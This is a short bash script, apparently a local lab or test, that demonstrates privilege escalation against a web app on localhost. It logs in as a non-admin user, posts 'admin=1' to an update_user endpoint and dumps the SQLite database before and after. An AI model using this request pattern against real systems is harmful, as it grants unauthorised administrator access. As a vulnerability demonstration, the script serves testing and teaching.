#!/usr/bin/env bash

function separator {
    printf "\n\e[1;33m%-$(tput cols)s\e[0m\n" "--$*" | tr " " "-"
}

separator "dump db"
sqlite3 database.db .dump

separator "login"
curl -v 'http://127.0.0.1:5005/login' --data-raw 'username=user&password=notadmin' --cookie-jar cookies.txt
echo
echo

separator "update_user"
curl -v 'http://127.0.0.1:5005/update_user' --data-raw 'username=user&admin=1' --cookie cookies.txt
echo
echo

separator "dump db"
sqlite3 database.db .dump
